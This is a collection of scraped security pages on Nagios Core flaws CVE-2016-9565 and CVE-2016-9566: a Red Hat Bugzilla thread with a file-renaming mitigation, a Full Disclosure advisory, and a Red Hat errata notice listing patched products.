| [Description](show_bug.cgi?id=1405363#c0)  Adam Mariš    2016-12-16 10:14:14 UTC  ``` MagpieRSS, a component for handling RSS news feeds in Nagios Core control panel / front-end, was found vulnerable to command injection due to insufficient neutralization of special elements in function _httpsrequest().  The vulnerability could potentially enable remote unauthenticated attackers who  managed to impersonate the feed server (via DNS poisoning, domain hijacking, ARP spoofing etc.), to provide a malicious response that injects parameters to curl command used by the affected RSS client class and effectively read/write arbitrary files on the vulnerable Nagios server. This could lead to Remote Code Execution in the context of www-data/nagios user on default Nagios installs that follow the official setup guidelines.  This issue is due to incomplete fix of [CVE-2008-4796](https://access.redhat.com/security/cve/CVE-2008-4796).  External References:  <https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>   ```  [Comment 1](show_bug.cgi?id=1405363#c1)  Adam Mariš    2016-12-16 10:15:44 UTC  ```  Created nagios tracking bugs for this issue:  Affects: fedora-all [[bug 1405364](show_bug.cgi?id=1405364 "CLOSED ERRATA - CVE-2016-9565 nagios: Command injection via curl in MagpieRSS [fedora-all]")] Affects: epel-all [[bug 1405365](show_bug.cgi?id=1405365 "CLOSED ERRATA - CVE-2016-9565 nagios: Command injection via curl in MagpieRSS [epel-all]")]   ```  [Comment 2](show_bug.cgi?id=1405363#c2)  Jason Shepherd    2016-12-21 00:26:25 UTC  ``` I looked at this in relation to Nagios 4.0.8 and found that Snoopy's fetch funtion is used by rss_fetch in Nagios. The 'rss_fetch' method in 'rss_fetch.inc' is called by various php files in Nagios, but doesn't except user input to the request. Setting RHMAP as wontfix as a consequence.   ```  [Comment 4](show_bug.cgi?id=1405363#c4)  Andrej Nemec    2016-12-21 09:02:16 UTC  ``` References:  <http://seclists.org/oss-sec/2016/q4/714>   ```  [Comment 6](show_bug.cgi?id=1405363#c6)  Siddharth Sharma    2016-12-21 14:55:50 UTC  ``` Mitigation:  #!/bin/bash  mv /usr/share/nagios/html/includes/rss /usr/share/nagios/html/includes/rss.disarmed mv /usr/share/nagios/html/rss-corefeed.php /usr/share/nagios/html/rss-corefeed.php.disarmed mv /usr/share/nagios/html/rss-newsfeed.php /usr/share/nagios/html/rss-newsfeed.php.disarmed  This should disable rss from nagios installation and stop affected php code from being executed. Only downside to this would be news widget wont fetch any data from nagios.org rss feeds.   ```  [Comment 7](show_bug.cgi?id=1405363#c7)  Siddharth Sharma    2016-12-21 15:59:40 UTC  ``` Nagios is shipped with Red Hat Gluster Storage 3.1, Red Hat Openstack 5,6,7, and  Red Hat Mobile Application Platform 4. We are currently investigating for  solutions. In the mean time please apply mitigation as mentioned in  [https://bugzilla.redhat.com/show_bug.cgi?id=1405363#c6](show_bug.cgi?id=1405363#c6 "CLOSED ERRATA - CVE-2016-9565 nagios: Command injection via curl in MagpieRSS") which will disable affected PHP code from execution.   ```  [Comment 8](show_bug.cgi?id=1405363#c8)  Tomas Hoger    2016-12-21 22:05:39 UTC  ``` This issue is actually in Snoopy - a PHP class for fetching web pages:  <https://sourceforge.net/projects/snoopy/>  Snoopy is embedded in MagpieRSS, which is embedded in nagios.  The issue was fixed in Snoopy upstream by changing it to use native PHP functions to fetch web pages instead of using curl:  <http://snoopy.cvs.sourceforge.net/viewvc/snoopy/Snoopy/Snoopy.class.php?view=log#rev1.29>  Nagios upstream fixed the problem in version 4.2.2 by removing MagpieRSS and hence Snoopy:  <https://github.com/NagiosEnterprises/nagioscore/commit/f0808f9c2aca777685ba57e71a8cd7b4baa8aa78>  Note that this CVE is actually a dupe of [CVE-2014-5008](https://access.redhat.com/security/cve/CVE-2014-5008) ([bug 1121497](show_bug.cgi?id=1121497 "CLOSED ERRATA - CVE-2008-7313 CVE-2014-5008 CVE-2014-5009 snoopy: incomplete fixes for command execution flaws")).   ```  [Comment 11](show_bug.cgi?id=1405363#c11)  Stephen John Smoogen    2017-01-16 17:26:09 UTC  ``` Current status: This package does not have an active maintainer. I am working on an updated replacement package which fixes these problems but need some reviews and help to make it work on Fedora 24/25 and help with selinux policy to get it ready to put into the 'stream'.  The updated replacement package is at:  <https://copr.fedorainfracloud.org/coprs/smooge/Nagios_Update/>  I do not know if this fixes the security bug so I need help here also.   ```  [Comment 12](show_bug.cgi?id=1405363#c12)  Scott Wilkerson    2017-01-16 18:29:34 UTC  ``` Stephen,  your copr package should fix the vulnerability as they should be all fixed as of Nagios 4.2.4.   ```  [Comment 15](show_bug.cgi?id=1405363#c15)  errata-xmlrpc    2017-01-31 05:53:53 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux OpenStack Platform 7.0 (Kilo) for RHEL 7  Via RHSA-2017:0214 <https://rhn.redhat.com/errata/RHSA-2017-0214.html>   ```  [Comment 16](show_bug.cgi?id=1405363#c16)  errata-xmlrpc    2017-01-31 05:55:15 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux OpenStack Platform 6.0 (Juno) for RHEL 7  Via RHSA-2017:0213 <https://rhn.redhat.com/errata/RHSA-2017-0213.html>   ```  [Comment 17](show_bug.cgi?id=1405363#c17)  errata-xmlrpc    2017-01-31 05:56:37 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux OpenStack Platform 5.0 (Icehouse) for RHEL 6  Via RHSA-2017:0212 <https://rhn.redhat.com/errata/RHSA-2017-0212.html>   ```  [Comment 18](show_bug.cgi?id=1405363#c18)  errata-xmlrpc    2017-01-31 05:58:10 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux OpenStack Platform 5.0 (Icehouse) for RHEL 7  Via RHSA-2017:0211 <https://rhn.redhat.com/errata/RHSA-2017-0211.html>   ```  [Comment 19](show_bug.cgi?id=1405363#c19)  errata-xmlrpc    2017-02-07 11:17:07 UTC  ``` This issue has been addressed in the following products:    Red Hat Gluster Storage 3.1 for RHEL 6  Via RHSA-2017:0259 <https://rhn.redhat.com/errata/RHSA-2017-0259.html>   ```  [Comment 20](show_bug.cgi?id=1405363#c20)  errata-xmlrpc    2017-02-07 11:18:04 UTC  ``` This issue has been addressed in the following products:    Red Hat Gluster Storage 3.1 for RHEL 7  Via RHSA-2017:0258 <https://rhn.redhat.com/errata/RHSA-2017-0258.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1405363&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from seclists.org_2cd6c546_20250124_212415.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](57)
[By Date](date.html#58)
[![Next](/images/right-icon-16x16.png)](59)

[![Previous](/images/left-icon-16x16.png)](57)
[By Thread](index.html#58)
[![Next](/images/right-icon-16x16.png)](59)

![](/shared/images/nst-icons.svg#search)

# Nagios Core < 4.2.4 Root Privilege Escalation [CVE-2016-9566]

---

*From*: Dawid Golunski <dawid () legalhackers com>

*Date*: Thu, 15 Dec 2016 07:24:27 -0200

---

```
Vulnerability:
Nagios Core < 4.2.4  Root Privilege Escalation
CVE-2016-9566

Discovered by: Dawid Golunski (@dawid_golunski)
<https://legalhackers.com>

Severity: High

Nagios Core daemon in versions below 4.2.4 was found to perform unsafe
operations when handling the log file. This could be exploited by
malicious local attackers to escalate their privileges from 'nagios'
system user,
or from a user belonging to 'nagios' group, to root.
The exploit could enable the attackers to fully compromise the system on which a
vulnerable Nagios version was installed.

To obtain the necessary level of access (nagios user/group), the
attackers could potentially use another Nagios vulnerability -
CVE-2016-9565.

The full advisory and a PoC exploit for CVE-2016-9566 can be found at:

<https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html>

The CVE-2016-9565 vulnerability can be found at:

<https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>

For updates, follow:

<https://twitter.com/dawid_golunski>

--
Regards,
Dawid Golunski
<https://legalhackers.com>
t: @dawid_golunski

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](57)
[By Date](date.html#58)
[![Next](/images/right-icon-16x16.png)](59)

[![Previous](/images/left-icon-16x16.png)](57)
[By Thread](index.html#58)
[![Next](/images/right-icon-16x16.png)](59)

### Current thread:

* **Nagios Core < 4.2.4 Root Privilege Escalation [CVE-2016-9566]** *Dawid Golunski (Dec 15)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from access.redhat.com_3f8837ed_20250126_033745.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from rhn.redhat.com_6dda8adb_20250124_212412.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2017:0211 - Security Advisory

Issued:
2017-01-31
Updated:
2017-01-31
# RHSA-2017:0211 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: nagios security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A0211)

## Topic

An update for nagios is now available for Red Hat Enterprise Linux OpenStack Platform 5.0 (Icehouse) for RHEL 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Nagios is a program that monitors hosts and services on your network, and has the ability to send email or page alerts when a problem arises or is resolved. Nagios is written in C and designed to run under Linux (and some other \*NIX variants) as a background process, intermittently running checks on various services that you specify. The actual service checks are performed by separate "plugin" programs which return the status of the checks to Nagios. Nagios plugins are available at <http://sourceforge.net/projects/nagiosplug.> This package provides the core program, web interface, and documentation files for Nagios. Development files are built as a separate package.

Security Fix(es):

* Various command-execution flaws were found in the Snoopy library included with Nagios. These flaws allowed remote attackers to execute arbitrary commands by manipulating Nagios HTTP headers. (CVE-2008-7313, CVE-2014-5008, CVE-2014-5009)
* It was found that an attacker who could control the content of an RSS feed could execute code remotely using the Nagios web interface. This flaw could be used to gain access to the remote system and in some scenarios control over the system. (CVE-2016-9565)
* A privileges flaw was found in Nagios where log files were unsafely handled. An attacker who could control Nagios logging configuration ('nagios' user/group) could exploit the flaw to elevate their access to that of a privileged user. (CVE-2016-9566)

Red Hat would like to thank Dawid Golunski for reporting CVE-2016-9565 and CVE-2016-9566.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

## Affected Products

* Red Hat OpenStack 5.0 for RHEL 7 x86\_64

## Fixes

* [BZ - 1121497](https://bugzilla.redhat.com/show_bug.cgi?id=1121497)
  - CVE-2008-7313 CVE-2014-5008 CVE-2014-5009 snoopy: incomplete fixes for command execution flaws
* [BZ - 1402869](https://bugzilla.redhat.com/show_bug.cgi?id=1402869)
  - CVE-2016-9566 nagios: Privilege escalation issue
* [BZ - 1405363](https://bugzilla.redhat.com/show_bug.cgi?id=1405363)
  - CVE-2016-9565 nagios: Command injection via curl in MagpieRSS

## CVEs

* [CVE-2008-7313](https://www.redhat.com/security/data/cve/CVE-2008-7313.html)
* [CVE-2014-5008](https://www.redhat.com/security/data/cve/CVE-2014-5008.html)
* [CVE-2014-5009](https://www.redhat.com/security/data/cve/CVE-2014-5009.html)
* [CVE-2016-9565](https://www.redhat.com/security/data/cve/CVE-2016-9565.html)
* [CVE-2016-9566](https://www.redhat.com/security/data/cve/CVE-2016-9566.html)

## References

* <https://access.redhat.com/security/updates/classification/#important>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat OpenStack 5.0 for RHEL 7

